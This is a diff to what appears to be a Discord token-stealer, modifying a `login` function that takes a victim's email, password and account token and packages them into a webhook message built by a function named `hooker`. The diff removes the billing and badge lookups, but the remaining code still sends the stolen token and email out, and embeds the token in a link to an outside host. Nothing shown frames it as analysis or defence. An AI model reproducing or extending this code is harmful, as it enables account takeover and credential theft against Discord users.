@@ -573,9 +573,6 @@ const hooker = async (content) => {
 
 const login = async (email, password, token) => {
   const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -587,16 +584,6 @@ const login = async (email, password, token) => {
             name: '<a:946246524634009600:990956317101424650> Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
-          },
-          {
-            name: '<:946246524172636161:990956262168617020> Nitro & Badges:',
-            value: `${badges}`,
-            inline: true,
-          },
-          {
-            name: '<a:946246524524978196:990956270624325662> Billing:',
-            value: `${billing}`,
-            inline: true,
           },
           {
             name: '<:946246524516581396:990956286189383780> Email:',
